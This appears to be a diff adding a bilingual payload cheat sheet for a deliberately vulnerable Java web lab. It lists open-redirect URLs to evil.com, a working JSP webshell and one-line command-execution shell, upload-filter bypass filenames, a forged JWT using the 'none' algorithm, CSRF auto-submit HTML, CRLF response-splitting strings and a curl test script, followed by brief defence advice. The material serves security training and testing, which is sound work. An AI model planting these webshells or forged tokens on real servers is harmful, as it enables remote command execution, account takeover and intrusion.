@@ -1,0 +1,349 @@
+# Web 安全漏洞测试 Payload
+# Web Security Vulnerability Test Payloads
+
+## URL 重定向（Open Redirect）Payloads
+
+### 基本重定向测试
+
+# 外部恶意 URL
+http://evil.com
+https://evil.com
+//evil.com
+
+# 协议相对 URL（绕过某些检查）
+//evil.com/phishing
+\\evil.com
+
+# URL 编码绕过
+%2F%2Fevil.com
+%2F%2F%2Fevil.com
+
+# 混淆技术
+http://example.com@evil.com
+http://example.com:80@evil.com
+
+### 测试命令
+
+# redirect 端点测试
+curl "http://localhost:8080/urlRedirect/redirect?url=http://evil.com" -L
+curl "http://localhost:8080/urlRedirect/redirect?url=//evil.com" -L
+
+# setHeader 端点测试
+curl -I "http://localhost:8080/urlRedirect/setHeader?url=http://evil.com"
+curl -I "http://localhost:8080/urlRedirect/setHeader?url=//evil.com"
+
+# forward 端点测试
+curl "http://localhost:8080/urlRedirect/forward?path=/admin"
+curl "http://localhost:8080/urlRedirect/forward?path=/WEB-INF/web.xml"
+
+---
+
+## 文件上传 Payloads
+
+### JSP Webshell 示例
+
+# 基本 JSP Webshell
+```jsp
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if (cmd != null) {
+    Process p = Runtime.getRuntime().exec(cmd);
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while ((line = br.readLine()) != null) {
+        out.println(line + "<br>");
+    }
+}
+%>
+<form method=post>
+Command: <input name=cmd type=text>
+<input type=submit value=Execute>
+</form>
+```
+
+# 一句话木马
+```jsp
+<%=Runtime.getRuntime().exec(request.getParameter("i"))%>
+```
+
+### 绕过技巧
+
+# 双扩展名
+shell.jpg.jsp
+shell.png.jsp
+shell.gif.jsp
+
+# 分号绕过
+shell.jsp;.jpg
+shell.jsp;.png
+
+# 空字节绕过（某些服务器）
+shell.jsp%00.jpg
+shell.jsp%00.png
+
+# 双写
+shell.jpg.jsp.jpg
+
+### 测试命令
+
+# 任意文件上传
+curl -F "file=@shell.jsp" http://localhost:8080/file/upload
+
+# 伪装图片上传（双扩展名）
+curl -F "file=@shell.jpg.jsp" http://localhost:8080/file/upload/picture
+
+# Base64 编码上传
+cat shell.jsp | base64 > shell.b64
+curl -d "filename=shell.jsp&content=$(cat shell.b64)" http://localhost:8080/file/upload/base64
+
+# 列出上传文件
+curl http://localhost:8080/file/list
+
+---
+
+## JWT 漏洞 Payloads
+
+### 弱密钥伪造
+
+# 已知弱密钥列表
+mySecretKey
+admin123
+secret
+password
+123456
+
+# 伪造步骤
+1. 获取原始 token
+2. 使用 jwt_tool 或在线工具解码
+3. 修改 payload 中的 role 为 "admin"
+4. 使用已知弱密钥重新签名
+5. 发送伪造的 token
+
+### 算法降级攻击
+
+# none 算法 payload
+Header: {"alg":"none","typ":"JWT"}
+Payload: {"sub":"admin","role":"administrator"}
+Signature: (empty)
+
+# 完整 token
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.
+
+### 测试命令
+
+# 生成普通用户 token
+curl "http://localhost:8080/jwt/generate?username=user"
+
+# 生成 admin token（使用已知密钥）
+curl "http://localhost:8080/jwt/generate?username=admin&key=admin123"
+
+# 验证 token
+curl "http://localhost:8080/jwt/verify?token=YOUR_TOKEN"
+
+# 测试 none 算法
+curl "http://localhost:8080/jwt/none?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0."
+
+# 获取泄露的密钥
+curl "http://localhost:8080/jwt/leak"
+
+---
+
+## CORS 漏洞 Payloads
+
+### 测试步骤
+
+1. 检查 CORS 头
+curl -H "Origin: http://evil.com" -H "Access-Control-Request-Method: GET" \
+  -X OPTIONS http://localhost:8080/cors/simple -v
+
+2. 检查 Origin 反射
+curl -H "Origin: http://evil.com" http://localhost:8080/cors/reflect -v
+
+3. 检查 null 源
+curl -H "Origin: null" http://localhost:8080/cors/null -v
+
+### 预期响应头
+
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Origin: http://evil.com
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+
+---
+
+## CSRF 漏洞 Payloads
+
+### 基本 CSRF 攻击 HTML
+
+# 图片标签 CSRF
+<img src="http://localhost:8080/csrf/vuln?action=transfer&to=attacker&amount=1000" width="0" height="0">
+
+# iframe CSRF
+<iframe src="http://localhost:8080/csrf/vuln?action=delete&id=1" style="display:none"></iframe>
+
+# 表单自动提交
+<form id="csrf" action="http://localhost:8080/csrf/vuln" method="POST">
+  <input name="action" value="transfer">
+  <input name="to" value="attacker">
+  <input name="amount" value="1000">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+
+### 测试命令
+
+# GET 请求 CSRF（最危险）
+curl "http://localhost:8080/csrf/vuln?action=transfer&to=attacker&amount=1000"
+
+# POST 请求 CSRF
+curl -X POST "http://localhost:8080/csrf/vuln?action=transfer&to=attacker&amount=1000"
+
+# 删除操作 CSRF
+curl "http://localhost:8080/csrf/delete?id=1"
+
+---
+
+## Cookie 漏洞 Payloads
+
+### 不安全 Cookie 测试
+
+# 设置不安全 Cookie
+curl -c - "http://localhost:8080/cookies/set?name=session&value=sensitive123"
+
+# 检查响应头中的 Cookie
+Set-Cookie: session=sensitive123; Path=/
+# 注意：缺少 Secure 和 HttpOnly 标志
+
+### Cookie 伪造攻击
+
+# 通过 Cookie 获取管理员权限
+curl -b "user=admin" http://localhost:8080/cookies/profile
+
+# 明文凭据 Cookie
+curl -c - "http://localhost:8080/cookies/login?username=admin&password=secret"
+# 结果：Cookie 中存储 session=admin:secret
+
+---
+
+## CRLF 注入 Payloads
+
+### 基本 CRLF 注入
+
+# URL 编码格式
+admin%0d%0aSet-Cookie:%20admin=true
+admin%0d%0aLocation:%20http://evil.com
+admin%0d%0aX-Admin:%20true
+
+### 响应头注入测试
+
+# 注入 Set-Cookie
+curl -i "http://localhost:8080/crlf/injection?name=admin%0d%0aSet-Cookie:%20admin=true"
+
+# 注入 Location（重定向）
+curl -i "http://localhost:8080/crlf/injection?name=admin%0d%0aLocation:%20http://evil.com"
+
+# 注入多个头
+curl -i "http://localhost:8080/crlf/injection?name=admin%0d%0aX-Admin:%20true%0d%0aX-Role:%20administrator"
+
+### 响应拆分攻击
+
+# 拆分响应体
+curl "http://localhost:8080/crlf/body?content=test%0d%0a%0d%0a<script>alert(1)</script>"
+
+# HTTP 缓存投毒
+curl "http://localhost:8080/crlf/redirect?path=/home%0d%0aLocation:%20http://evil.com"
+
+# 完全控制响应
+curl "http://localhost:8080/crlf/injection?name=test%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Pwned!</h1>"
+
+---
+
+## 综合测试命令
+
+### 一键测试脚本
+
+```bash
+#!/bin/bash
+
+TARGET="http://localhost:8080"
+
+echo "=== URL 重定向测试 ==="
+echo "1. sendRedirect:"
+curl -I "${TARGET}/urlRedirect/redirect?url=http://evil.com"
+
+echo "2. setHeader:"
+curl -I "${TARGET}/urlRedirect/setHeader?url=http://evil.com"
+
+echo ""
+echo "=== 文件上传测试 ==="
+echo "1. 列出上传目录:"
+curl "${TARGET}/file/list"
+
+echo "2. 上传测试:"
+curl -F "file=@test.txt" "${TARGET}/file/upload"
+
+echo ""
+echo "=== JWT 测试 ==="
+echo "1. 生成 token:"
+curl "${TARGET}/jwt/generate?username=user"
+
+echo "2. 获取密钥:"
+curl "${TARGET}/jwt/leak"
+
+echo ""
+echo "=== CORS 测试 ==="
+curl -H "Origin: http://evil.com" -I "${TARGET}/cors/simple"
+
+echo ""
+echo "=== CSRF 测试 ==="
+curl "${TARGET}/csrf/vuln?action=transfer&to=attacker&amount=1000"
+
+echo ""
+echo "=== CRLF 注入测试 ==="
+curl -i "${TARGET}/crlf/injection?name=admin%0d%0aSet-Cookie:%20admin=true"
+```
+
+---
+
+## 防御建议
+
+### URL 重定向防御
+1. 使用白名单验证重定向目标
+2. 使用相对路径进行重定向
+3. 实现重定向令牌验证
+
+### 文件上传防御
+1. 验证文件的真实类型（Magic Number）
+2. 重命名上传的文件
+3. 存储在不可执行的目录
+4. 限制上传文件大小
+
+### JWT 安全
+1. 使用强随机密钥
+2. 固定签名算法
+3. 验证 token 签名和过期时间
+4. 不接受 none 算法
+
+### CORS 安全
+1. 使用白名单配置 Access-Control-Allow-Origin
+2. 不使用 Access-Control-Allow-Origin: *
+3. 限制 Access-Control-Allow-Methods
+
+### CSRF 防御
+1. 实现 CSRF token 验证
+2. 使用 SameSite Cookie 属性
+3. 验证 Origin 和 Referer 头
+4. 敏感操作使用 POST 请求
+
+### Cookie 安全
+1. 设置 Secure 标志
+2. 设置 HttpOnly 标志
+3. 设置 SameSite 属性
+4. 不在 Cookie 中存储敏感信息
+
+### CRLF 注入防御
+1. 过滤所有用户输入中的 \r\n 字符
+2. 使用安全的 API 设置响应头
+3. 验证和规范化输入
